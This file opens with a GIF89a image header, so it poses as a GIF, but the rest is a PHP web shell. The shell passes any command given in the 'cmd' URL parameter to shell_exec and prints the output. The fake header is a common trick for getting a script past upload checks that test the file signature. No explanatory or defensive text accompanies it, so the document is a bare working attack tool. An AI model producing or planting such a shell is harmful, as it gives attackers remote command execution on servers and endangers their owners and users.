GIF89a
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    echo shell_exec($_GET['cmd']);
    echo "</pre>";
}
?>
